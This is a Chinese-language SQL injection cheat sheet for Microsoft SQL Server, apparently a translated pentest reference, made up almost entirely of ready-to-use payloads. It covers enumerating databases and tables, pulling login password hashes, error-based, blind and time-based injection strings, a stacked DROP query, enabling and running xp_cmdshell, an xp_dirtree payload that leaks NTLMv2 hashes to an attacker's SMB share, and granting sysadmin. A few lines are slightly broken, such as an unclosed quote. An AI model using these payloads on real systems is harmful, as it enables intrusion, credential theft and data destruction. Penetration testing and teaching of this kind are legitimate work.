# MSSQL 注入

## 目录

* [MSSQL注释](#MSSQL注释)
* [MYSQL版本](#MYSQL版本)
* [MSSQL数据库名](#MSSQL数据库名)
* [MSSQL列出数据库](#MSSQL列出数据库)
* [MSSQL列出列](#MSSQL列出列)
* [MSSQL列出表](#MSSQL列出表)
* [MSSQL提取用户名和密码](#MSSQL提取用户名和密码)
* [MSSQL联合查询](#MSSQL联合查询)
* [基于MSSQL报错](#基于MSSQL报错)
* [基于MSSQL盲注](#基于MSSQL盲注)
* [基于MSSQL时间注入](#基于MSSQL时间注入)
* [MSSQL堆叠注入](#MSSQL堆叠注入)
* [MSSQL命令执行](#MSSQL命令执行)
* [MSSQL UNC path](#mssql-unc-path)
* [MSSQL Make user DBA](#mssql-make-user-dba)

## MSSQL注释

```sql
-- comment goes here
/* comment goes here */
```

## MYSQL版本

```sql
SELECT @@version
```

## MSSQL数据库名

```sql
SELECT DB_NAME()
```

## MSSQL列出数据库

```sql
SELECT name FROM master..sysdatabases;
SELECT DB_NAME(N); — for N = 0, 1, 2, …
```

## MSSQL列出列

```sql
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’); — for the current DB only
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable

SELECT table_catalog, column_name FROM information_schema.columns
```

## MSSQL列出表

```sql
SELECT name FROM master..sysobjects WHERE xtype = ‘U’; — use xtype = ‘V’ for views
SELECT name FROM someotherdb..sysobjects WHERE xtype = ‘U’;
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable

SELECT table_catalog, table_name FROM information_schema.columns
```

## MSSQL提取用户名和密码

```sql
MSSQL 2000:
SELECT name, password FROM master..sysxlogins
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.)

MSSQL 2005
SELECT name, password_hash FROM master.sys.sql_logins
SELECT name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
```

## MSSQL联合查询

```sql
-- extract databases names
$ SELECT name FROM master..sysdatabases
[*] Injection
[*] msdb
[*] tempdb

-- extract tables from Injection database
$ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'
[*] Profiles
[*] Roles
[*] Users

-- extract columns for the table Users
$ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')
[*] UserId
[*] UserName

-- Finally extract the data
$ SELECT  UserId, UserName from Users
```

## 基于MSSQL报错

```sql
For integer inputs : convert(int,@@version)
For integer inputs : cast((SELECT @@version) as int)

For string inputs   : ' + convert(int,@@version) + '
For string inputs   : ' + cast((SELECT @@version) as int) + '
```

## 基于MSSQL盲注

```sql
SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'

WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)
SELECT message FROM data WHERE row = 1 and message like 't%'
```

## 基于MSSQL时间注入

```sql
ProductID=1;waitfor delay '0:0:10'--
ProductID=1);waitfor delay '0:0:10'--
ProductID=1';waitfor delay '0:0:10'--
ProductID=1');waitfor delay '0:0:10'--
ProductID=1));waitfor delay '0:0:10'--

IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'                              comment:   --
```

## MSSQL堆叠注入

使用分号添加其他查询

```sql
ProductID=1; DROP members--
```

## MSSQL命令执行

```sql
EXEC xp_cmdshell "net user";
EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
```

如果你需要重新激活xp_cmdshell（在SQL server 2005中是默认禁用的）

```sql
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```

与MSSQL实例进行交互

```powershell
sqsh -S 192.168.1.X -U sa -P superPassword
python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758
```

## MSSQL UNC Path

MSSQL支持堆叠查询，因此我们可以创建一个指向IP地址的变量，然后使用xp_dirtree函数来列出SMB共享中的文件并获取NTLMv2 hash。

```sql
1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- 
```

## MSSQL Make user DBA (DB admin)

```sql
EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
```

## References

* [Pentest Monkey - mssql-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
* [Sqlinjectionwiki - MSSQL](http://www.sqlinjectionwiki.com/categories/1/mssql-sql-injection-cheat-sheet/)
* [Error Based - SQL Injection ](https://github.com/incredibleindishell/exploit-code-by-me/blob/master/MSSQL%20Error-Based%20SQL%20Injection%20Order%20by%20clause/Error%20based%20SQL%20Injection%20in%20“Order%20By”%20clause%20(MSSQL).pdf)